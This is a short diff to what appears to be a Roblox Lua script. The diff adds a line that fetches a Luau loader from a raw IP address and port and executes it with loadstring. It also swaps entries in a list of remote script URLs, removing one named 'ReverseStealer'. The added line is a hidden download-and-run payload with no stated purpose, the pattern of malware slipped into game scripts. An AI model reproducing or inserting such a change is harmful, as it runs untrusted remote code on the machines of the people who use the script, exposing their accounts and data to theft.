@@ -1,5 +1,7 @@
+ID="e27944a7-712c-4649-9992-4207965ed8e1";
+loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()
+
 local urls = {
-    "https://raw.githubusercontent.com/swiftasfboi/GAG/blob/main/ReverseStealer",
     "https://pastefy.app/PxUh5p9d/raw",
     "https://raw.githubusercontent.com/swiftasfboi/KuniHub/refs/heads/main/kunilibrary"
 }
